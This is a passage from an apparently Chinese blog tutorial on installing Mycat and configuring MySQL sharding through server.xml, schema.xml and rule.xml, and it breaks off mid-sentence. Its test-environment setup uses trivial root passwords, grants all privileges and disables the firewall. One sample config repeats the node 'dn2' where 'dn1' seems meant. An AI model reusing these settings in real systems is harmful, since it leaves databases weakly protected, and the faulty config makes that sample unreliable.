mysql</div><div class="line">server2 192.168.1.216 mycat JDK</div></pre></div></div></figure><h2 id="1-安装Mycat"><a href="#1-安装Mycat" class="headerlink" title="1. 安装Mycat"></a>1. 安装Mycat</h2><p>Mycat依赖java环境，所以要安装jdk，这里直接使用<code>yum -y install java</code> 安装java环境</p><blockquote><p>如果需要<code>jps, jmap</code>等命令则执行<code>yum -y install java-devel</code></p></blockquote><p>下载Mycat</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#执行在server2</span></div><div class="line"></div><div class="line">mkdir -p /usr/<span class="built_in">local</span>/mycat &amp;&amp; <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/mycat</div><div class="line"></div><div class="line">wget -c -t5 -O Mycat-1.6.tar.gz <span class="string">"http://dl.mycat.io/1.6-RELEASE/Mycat-server-1.6-RELEASE-20161028204710-linux.tar.gz"</span></div><div class="line"></div><div class="line">tar xvf Mycat-1.6.tar.gz -C ./</div></pre></div></div></figure><p>我们来大概看一下Mycat的目录结构：</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></div><div class="code"><pre><div class="line">.</div><div class="line">├── bin</div><div class="line">│   ├── mycat          Mycat启动程序</div><div class="line">│   ├── ...</div><div class="line">├── catlet</div><div class="line">├── conf</div><div class="line">│   ├── log4j2.xml     日志的配置 根据自己的需要可以调整输出级别为debug</div><div class="line">│   ├── rule.xml       分片规则的配置文件，分片规则的具体参数信息单独存放为文件，也在当前目录，配置文件修改需要重启MyCAT。</div><div class="line">│   ├── schema.xml     逻辑库定义和表以及分片定义的配置文件。</div><div class="line">│   ├── server.xml     Mycat服务器参数调整和用户授权的配置文件。</div><div class="line">│   ├── wrapper.conf   JVM内存配置文件</div><div class="line">│   ├── zkconf         Zookeeper配置目录</div><div class="line">├── lib                MyCAT自身的jar包或依赖的jar包的存放目录。</div><div class="line">├── logs               MyCAT日志的存放目录。日志存放在logs/log中，每天一个文件。</div><div class="line">└── version.txt        版本信息</div></pre></div></div></figure><h2 id="2-配置"><a href="#2-配置" class="headerlink" title="2. 配置"></a>2. 配置</h2><h3 id="配置Mycat服务器参数"><a href="#配置Mycat服务器参数" class="headerlink" title="配置Mycat服务器参数"></a>配置Mycat服务器参数</h3><p>编辑Mycat服务器参数调整和用户授权的配置文件<code>vim conf/server.xml</code>(配置文件中有注释)首先备份一份，<code>cp conf/server.xml conf/server.xml.bak</code><br>跳转到文件尾部编辑如下</p><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></div><div class="code"><pre><div class="line"><span class="comment">&lt;!--此处定义的用户，为Client连接Mycat的用户密码，可以配置相关数据库及表读写的权限，--&gt;</span></div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">user</span> <span class="attr">name</span>=<span class="string">"root"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"schemas"</span>&gt;</span>TESTDB<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--&lt;property name="readOnly"&gt;true&lt;/property&gt;--&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></div><div class="line">        </div><div class="line">        <span class="comment">&lt;!--  表级 DML 权限设置   --&gt;</span></div><div class="line">        <span class="comment">&lt;!--       </span></div><div class="line"><span class="comment">        &lt;privileges check="false"&gt;</span></div><div class="line"><span class="comment">                &lt;schema name="TESTDB" dml="0110" &gt;</span></div><div class="line"><span class="comment">                        &lt;table name="tb01" dml="0000"&gt;&lt;/table&gt;</span></div><div class="line"><span class="comment">                        &lt;table name="tb02" dml="1111"&gt;&lt;/table&gt;</span></div><div class="line"><span class="comment">                &lt;/schema&gt;</span></div><div class="line"><span class="comment">        &lt;/privileges&gt;           </span></div><div class="line"><span class="comment">         --&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!--此处定义连接IP白名单和 SQL 黑名单--&gt;</span></div><div class="line"></div><div class="line">        <span class="comment">&lt;!-- 全局SQL防火墙设置 --&gt;</span></div><div class="line">        <span class="comment">&lt;!-- </span></div><div class="line"><span class="comment">&lt;firewall&gt;</span></div><div class="line"><span class="comment"> &lt;whitehost&gt;</span></div><div class="line"><span class="comment"> &lt;host user="mycat" host="127.0.0.1"&gt;&lt;/host&gt; ip 白名单 用户对应的可以访问的 ip 地址</span></div><div class="line"><span class="comment"> &lt;/whitehost&gt;</span></div><div class="line"><span class="comment"> &lt;blacklist check="true"&gt;</span></div><div class="line"><span class="comment"> &lt;property name="selelctAllow"&gt;false&lt;/property&gt; 黑名单允许的 权限 后面为默认</span></div><div class="line"><span class="comment"> &lt;/blacklist&gt;</span></div><div class="line"><span class="comment">&lt;/firewall&gt;</span></div><div class="line"><span class="comment">--&gt;</span></div><div class="line"></div><div class="line"></div><div class="line">#</div></pre></div></div></figure><h3 id="配置逻辑库表，分片定义"><a href="#配置逻辑库表，分片定义" class="headerlink" title="配置逻辑库表，分片定义"></a>配置逻辑库表，分片定义</h3><p>编辑逻辑库定义和表以及分片定义的配置文件<code>vim conf/schema.xml</code>同样先备份一份<code>cp conf/schema.xml conf/schema.xml.bak</code>编辑为如下内容</p><p>有如下表结构：</p><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></div><div class="code"><pre><div class="line">+<span class="comment">--------------------+-------+------------------------+--------------------+</span></div><div class="line">| ID                 | LEVEL | EXTEND_ATTR            | UID                |</div><div class="line">+<span class="comment">--------------------+-------+------------------------+--------------------+</span></div><div class="line">| 298599220716244992 |     1 | &#123;&#125;                     | 298321762779664384 |</div><div class="line">| 298600412901019648 |     0 | &#123;&#125;                     | 298321762779664384 |</div><div class="line">| 298682157746884608 |     3 | &#123;"129":2&#125;              | 298667788531142656 |</div><div class="line">| 298684200884637696 |     2 | &#123;&#125;                     | 298667788531142656 |</div><div class="line">| 298685806279659520 |     2 | &#123;&#125;                     | 298667788531142656 |</div><div class="line">| 298686594007699456 |     2 | &#123;&#125;                     | 298667788531142656 |</div><div class="line">| 298687219567169536 |     2 | &#123;&#125;                     | 298667788531142656 |</div><div class="line">| 298688215626289152 |     1 | &#123;&#125;                     | 298667788531142656 |</div><div class="line">| 298689820996145152 |     1 | &#123;&#125;                     | 298667788531142656 |</div><div class="line">+<span class="comment">--------------------+-------+------------------------+--------------------+</span></div></pre></div></div></figure><p>这里选择根据UID进行水平切分，配置文件如下：</p><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></div><div class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE mycat:schema SYSTEM "schema.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">mycat:schema</span> <span class="attr">xmlns:mycat</span>=<span class="string">"http://io.mycat/"</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--定义逻辑数据库TESTDB，逻辑表t_rune,主键、切分规则(mod-long)，和数据库节点(dn2,dn2,dn3)--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">"TESTDB"</span> <span class="attr">checkSQLschema</span>=<span class="string">"false"</span> <span class="attr">sqlMaxLimit</span>=<span class="string">"100"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_rune"</span>  <span class="attr">primaryKey</span>=<span class="string">"uid"</span> <span class="attr">dataNode</span>=<span class="string">"dn2,dn2,dn3"</span> <span class="attr">rule</span>=<span class="string">"mod-long"</span> &gt;</span></div><div class="line">                <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">schema</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--定义每个数据库节点相关信息--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">"dn2"</span> <span class="attr">dataHost</span>=<span class="string">"server1"</span> <span class="attr">database</span>=<span class="string">"db1"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">"dn2"</span> <span class="attr">dataHost</span>=<span class="string">"server1"</span> <span class="attr">database</span>=<span class="string">"db2"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">"dn3"</span> <span class="attr">dataHost</span>=<span class="string">"server1"</span> <span class="attr">database</span>=<span class="string">"db3"</span> /&gt;</span></div><div class="line">        <span class="comment">&lt;!--等同于以上配置&lt;dataNodename=“dn$1-3” dataHost=“server1” database=“db$1-3”/&gt; --&gt;</span></div><div class="line">        <span class="comment">&lt;!--定义主机信息，及Mysql用户密码--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataHost</span> <span class="attr">name</span>=<span class="string">"server1"</span> <span class="attr">maxCon</span>=<span class="string">"1000"</span> <span class="attr">minCon</span>=<span class="string">"10"</span> <span class="attr">balance</span>=<span class="string">"0"</span></span></div><div class="line"><span class="tag">                          <span class="attr">writeType</span>=<span class="string">"0"</span> <span class="attr">dbType</span>=<span class="string">"mysql"</span> <span class="attr">dbDriver</span>=<span class="string">"native"</span> <span class="attr">switchType</span>=<span class="string">"1"</span>  <span class="attr">slaveThreshold</span>=<span class="string">"100"</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--心跳检测语句--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">heartbeat</span>&gt;</span>select user()<span class="tag">&lt;/<span class="name">heartbeat</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!-- 远程数据库配置信息 --&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">writeHost</span> <span class="attr">host</span>=<span class="string">"192.168.99.21"</span> <span class="attr">url</span>=<span class="string">"192.168.99.214:3306"</span> <span class="attr">user</span>=<span class="string">"root"</span></span></div><div class="line"><span class="tag">                                   <span class="attr">password</span>=<span class="string">"root"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;/<span class="name">writeHost</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">dataHost</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">mycat:schema</span>&gt;</span></div></pre></div></div></figure><blockquote><p>无论分片与否,每张表都需要定义, 生产,例:</p></blockquote><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></div><div class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE mycat:schema SYSTEM "schema.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">mycat:schema</span> <span class="attr">xmlns:mycat</span>=<span class="string">"http://io.mycat/"</span>&gt;</span></div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">"bigduck"</span> <span class="attr">checkSQLschema</span>=<span class="string">"true"</span> <span class="attr">sqlMaxLimit</span>=<span class="string">"100"</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!--分--&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_shop_visible--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_shop_visible"</span> <span class="attr">primaryKey</span>=<span class="string">"ID"</span> <span class="attr">dataNode</span>=<span class="string">"dn$1-15"</span> <span class="attr">rule</span>=<span class="string">"mod-long"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_friendlog--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_friendlog"</span> <span class="attr">primaryKey</span>=<span class="string">"ID"</span> <span class="attr">dataNode</span>=<span class="string">"dn$1-15"</span> <span class="attr">rule</span>=<span class="string">"mod-long"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_room--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_room"</span> <span class="attr">primaryKey</span>=<span class="string">"ID"</span> <span class="attr">dataNode</span>=<span class="string">"dn$1-15"</span> <span class="attr">rule</span>=<span class="string">"mod-long"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_npc--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_npc"</span> <span class="attr">primaryKey</span>=<span class="string">"ID"</span> <span class="attr">dataNode</span>=<span class="string">"dn$1-15"</span> <span class="attr">rule</span>=<span class="string">"mod-long"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_arena_fight--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_arena_fight"</span> <span class="attr">primaryKey</span>=<span class="string">"ID"</span> <span class="attr">dataNode</span>=<span class="string">"dn$1-15"</span> <span class="attr">rule</span>=<span class="string">"mod-long"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!--不分--&gt;</span></div><div class="line">                <span class="comment">&lt;!--alliance_id--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"alliance_id"</span> <span class="attr">primaryKey</span>=<span class="string">"seq_id"</span> <span class="attr">dataNode</span>=<span class="string">"dn2"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_alliance_boss--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_alliance_boss"</span> <span class="attr">primaryKey</span>=<span class="string">"ALLIANCEID"</span> <span class="attr">dataNode</span>=<span class="string">"dn2"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_alliance_boss_id--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_alliance_boss_id"</span> <span class="attr">primaryKey</span>=<span class="string">"ALLIANCEID"</span> <span class="attr">dataNode</span>=<span class="string">"dn2"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_alliance_boss_log--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_alliance_boss_log"</span> <span class="attr">primaryKey</span>=<span class="string">"ID"</span> <span class="attr">dataNode</span>=<span class="string">"dn2"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_alliance_member_boss--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_alliance_member_boss"</span> <span class="attr">primaryKey</span>=<span class="string">"UID"</span> <span class="attr">dataNode</span>=<span class="string">"dn2"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line"></div><div class="line"></div><div class="line">                <span class="comment">&lt;!-- global table is auto cloned to all defined data nodes ,so can join</span></div><div class="line"><span class="comment">                        with any table whose sharding node is in the same data node --&gt;</span></div><div class="line">                <span class="comment">&lt;!--全局表--&gt;</span></div><div class="line"><span class="comment">&lt;!--t_arena--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_arena"</span> <span class="attr">primaryKey</span>=<span class="string">"UID"</span> <span class="attr">type</span>=<span class="string">"global"</span> <span class="attr">dataNode</span>=<span class="string">"dn2"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line"></div><div class="line"></div><div class="line">        <span class="tag">&lt;/<span class="name">schema</span>&gt;</span></div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">"dn$1-5"</span> <span class="attr">dataHost</span>=<span class="string">"mysql-server-01"</span> <span class="attr">database</span>=<span class="string">"db$11-15"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">"dn$6-10"</span> <span class="attr">dataHost</span>=<span class="string">"mysql-server-02"</span> <span class="attr">database</span>=<span class="string">"db$21-25"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">"dn$11-15"</span> <span class="attr">dataHost</span>=<span class="string">"mysql-server-03"</span> <span class="attr">database</span>=<span class="string">"db$31-35"</span> /&gt;</span></div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">dataHost</span> <span class="attr">name</span>=<span class="string">"mysql-server-01"</span> <span class="attr">maxCon</span>=<span class="string">"2000"</span> <span class="attr">minCon</span>=<span class="string">"100"</span> <span class="attr">balance</span>=<span class="string">"0"</span> <span class="attr">dbType</span>=<span class="string">"mysql"</span> <span class="attr">dbDriver</span>=<span class="string">"native"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">heartbeat</span>&gt;</span>select user()<span class="tag">&lt;/<span class="name">heartbeat</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">writeHost</span> <span class="attr">host</span>=<span class="string">"172.17.0.2"</span> <span class="attr">url</span>=<span class="string">"172.17.0.2:3306"</span> <span class="attr">user</span>=<span class="string">"root"</span></span></div><div class="line"><span class="tag">                                   <span class="attr">password</span>=<span class="string">"pa33w0rd"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;/<span class="name">writeHost</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">dataHost</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataHost</span> <span class="attr">name</span>=<span class="string">"mysql-server-02"</span> <span class="attr">maxCon</span>=<span class="string">"2000"</span> <span class="attr">minCon</span>=<span class="string">"100"</span> <span class="attr">balance</span>=<span class="string">"0"</span> <span class="attr">dbType</span>=<span class="string">"mysql"</span> <span class="attr">dbDriver</span>=<span class="string">"native"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">heartbeat</span>&gt;</span>select user()<span class="tag">&lt;/<span class="name">heartbeat</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">writeHost</span> <span class="attr">host</span>=<span class="string">"172.17.0.3"</span> <span class="attr">url</span>=<span class="string">"172.17.0.3:3306"</span> <span class="attr">user</span>=<span class="string">"root"</span></span></div><div class="line"><span class="tag">                                   <span class="attr">password</span>=<span class="string">"pa33w0rd"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;/<span class="name">writeHost</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">dataHost</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataHost</span> <span class="attr">name</span>=<span class="string">"mysql-server-03"</span> <span class="attr">maxCon</span>=<span class="string">"2000"</span> <span class="attr">minCon</span>=<span class="string">"100"</span> <span class="attr">balance</span>=<span class="string">"0"</span> <span class="attr">dbType</span>=<span class="string">"mysql"</span> <span class="attr">dbDriver</span>=<span class="string">"native"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">heartbeat</span>&gt;</span>select user()<span class="tag">&lt;/<span class="name">heartbeat</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">writeHost</span> <span class="attr">host</span>=<span class="string">"172.17.0.4"</span> <span class="attr">url</span>=<span class="string">"172.17.0.4:3306"</span> <span class="attr">user</span>=<span class="string">"root"</span></span></div><div class="line"><span class="tag">                                   <span class="attr">password</span>=<span class="string">"pa33w0rd"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;/<span class="name">writeHost</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">dataHost</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">mycat:schema</span>&gt;</span></div></pre></div></div></figure><h3 id="配置切片规则"><a href="#配置切片规则" class="headerlink" title="配置切片规则"></a>配置切片规则</h3><p>在上步的<code>schema.xml</code>文件中定义了分片规则：<code>rule=&quot;mod-long&quot;</code>此时编辑<code>conf/rule.xml</code>文件添加分片规则的具体参数信息</p><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></div><div class="code"><pre><div class="line">        <span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"mod-long"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">                        <span class="tag">&lt;<span class="name">columns</span>&gt;</span>uid<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">                        <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>mod-long<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">                <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--</span></div><div class="line"><span class="comment">name 属性指定唯一的名字，用于标识不同的表规则。</span></div><div class="line"><span class="comment">内嵌的 rule 标签则指定对物理表中的哪一列进行拆分和使用什么路由算法。</span></div><div class="line"><span class="comment">columns 内指定要拆分的列名字。</span></div><div class="line"><span class="comment">algorithm 使用 function 标签中的 name 属性。连接表规则和具体路由算法。当然，多个表规则可以连接到</span></div><div class="line"><span class="comment">同一个路由算法上。table 标签内使用。让逻辑表使用这个规则进行分片。</span></div><div class="line"><span class="comment">--&gt;</span></div><div class="line"></div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"mod-long"</span> <span class="attr">class</span>=<span class="string">"io.mycat.route.function.PartitionByMod"</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--注意！这里填写数据库节点数，否则无法分片--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"count"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!--</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">name 指定算法的名字。</span></div><div class="line"><span class="comment">class 制定路由算法具体的类名字。（此处使用求模法）</span></div><div class="line"><span class="comment">property 为具体算法需要用到的一些属性。</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">--&gt;</span></div></pre></div></div></figure><blockquote><p>具体切片算法规则：<strong><a href="https://kionf.com/2017/05/07/mycat-alg/">Mycat切片算法规则详解</a></strong></p></blockquote><h1 id="0x02-配置数据库节点"><a href="#0x02-配置数据库节点" class="headerlink" title="0x02 配置数据库节点"></a>0x02 配置数据库节点</h1><p>配置server1数据库，用户密码为<code>schema.xml</code>文件中配置相同，并允许server2运程连接</p><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> <span class="string">'root'</span>@<span class="string">'192.168.99.216'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'root'</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;</div><div class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</div></pre></div></div></figure><p>创建配置文件中数据库节点db1,db2.db3</p><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">create</span> <span class="keyword">database</span> db1 <span class="built_in">character</span> <span class="keyword">set</span> utf8;</div><div class="line"><span class="keyword">create</span> <span class="keyword">database</span> db2 <span class="built_in">character</span> <span class="keyword">set</span> utf8;</div><div class="line"><span class="keyword">create</span> <span class="keyword">database</span> db3 <span class="built_in">character</span> <span class="keyword">set</span> utf8;</div></pre></div></div></figure><p>测试环境中确认2台机器防火墙关闭<code>server iptables stop</code></p><p>返回到server1启动Mycat</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></div><div class="code"><pre><div class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/mycat</div><div class="line"></div><div class="line">./bin/mycat start</div><div class="line"></div><div class="line">[root@Centos6-8-TestEnv mycat]<span class="comment"># netstat -ntlp</span></div><div class="line">Active Internet connections (only servers)</div><div class="line">Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name   </div><div class="line">tcp        0      0 127.0.0.1:32000             0.0.0.0:*                   LISTEN      8613/java           </div><div class="line">tcp        0      0 :::1984                     :::*                        LISTEN      8613/java     </div><div class="line">tcp        0      0 :::8066                     :::*                        LISTEN      8613/java</div><div class="line"><span class="comment">#确保8066端口监听此为Mycat服务器默认端口         </span></div><div class="line">tcp        0      0 :::60743                    :::*                        LISTEN      8613/java    </div><div class="line">tcp        0      0 :::43303                    :::*                        LISTEN      8613/java    </div><div class="line">tcp        0      0 :::9066                     :::*                        LISTEN      8613/java</div></pre></div></div></figure><h1 id="0x03-数据迁移"><a href="#0x03-数据迁移" class="headerlink" title="0x03 数据迁移"></a>0x03 数据迁移</h1><p>编辑<code>/etc/my.cnf</code>添加<br><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">[mysqldump]</div><div class="line"></div><div class="line">max_allowed_packet      = 16M</div><div class="line">#default-character-set   = utf8mb4</div></pre></div></div></figure></p><p>mysqldump导入报<code>ERROR 1153 (08S01) at line 1133809: Got a packet bigger than &#39;max_allowed_packet&#39; 